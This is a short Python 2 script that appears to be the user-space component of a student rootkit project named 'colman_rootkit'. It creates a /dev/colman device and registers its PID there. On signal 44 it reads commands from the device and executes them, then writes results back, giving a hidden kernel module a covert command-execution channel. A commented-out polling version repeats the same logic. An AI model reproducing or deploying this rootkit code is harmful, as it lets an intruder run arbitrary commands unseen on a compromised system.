import fcntl
import sys
import subprocess
import os
import signal  

SIG_TEST = 44


def main():
	signal.signal(SIG_TEST, receiveSignal)
	subprocess.call(["mknod", "/dev/colman", "c", "256", "0"])
	colman = open('/dev/colman', 'w')
	colman.write(str(os.getpid()))
	colman.close()
	print "PID sent"
	while True:
		pass

def receiveSignal(signalNumber, frame):  
	colman_read = open('/dev/colman', 'rb')
	colman_result = open('/home/shahart/colman_rootkit/output.txt', 'wb')

	cmd = colman_read.read()
	if cmd:
		print "cmd: ", cmd
		print cmd.split(" ")
		try:
			result = subprocess.call(cmd.split(" "))
		except:
			return
		colman_result.write(str(result))
		print "output.txt created"
	colman_result.close()
	colman_read.close()
	colman = open('/dev/colman', 'w')
	print "send output.txt"
	colman.write("file: output.txt")
	colman.close()
	return

main()


# colman = open('/dev/colman', 'rb')
# colman_result = open('/home/shahart/colman_rootkit/output.txt', 'wb')

# cmd = " "

# while True:
# 	cmd = colman.read()
# 	if cmd:
# 		print "cmd: ", cmd
# 		try:
# 			#result = os.system(cmd);
# 			print cmd.split(" ")
# 			result = subprocess.call(cmd.split(" "))
# 		except:
# 			continue
# 		print "result: ", result
# 		colman_result.write(str(result))
		
# 		colman.close()
# 		colman = open('/dev/colman', 'w')
# 		colman.write("file: output.txt")
# 		colman.close()
# 		colman = open('/dev/colman', 'rb')
# 	pass


# colman.close()
# print 
